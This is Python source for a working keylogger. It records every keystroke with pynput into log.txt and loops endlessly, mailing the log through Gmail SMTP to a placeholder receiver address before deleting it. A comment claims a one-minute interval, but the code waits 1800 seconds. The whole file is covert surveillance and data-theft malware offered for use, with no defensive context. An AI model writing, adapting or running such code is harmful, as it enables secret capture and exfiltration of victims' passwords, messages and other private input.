import smtplib
import os
import time
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from pynput.keyboard import Listener


# Function to send email with attachment
def send_email():
    # Email configuration
    receiver_email = "Enter the person to recieve the log.txt file"
    sender_email = "enter an email address"
    password = "enter app password"

    # Create a multipart message
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = "Keylog Report"

    # Attach the log file
    filename = "log.txt"
    with open(filename, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    encoders.encode_base64(part)

    part.add_header(
        "Content-Disposition",
        f"attachment; filename= {filename}",
    )

    message.attach(part)

    # Connect to SMTP server and send email
    with smtplib.SMTP("smtp.gmail.com", 587) as server:
        server.starttls()
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message.as_string())


# Function to handle key presses
def on_press(key):
    with open("log.txt", "a") as file:
        file.write(str(key) + "\n")


# Main loop
while True:
    # Create a listener
    with Listener(on_press=on_press) as listener:
        # Listen for 1 minute
        time.sleep(1800)
        # Stop the listener
        listener.stop()

    # Send the log file via email
    send_email()

    # Remove the log file after sending
    os.remove("log.txt")
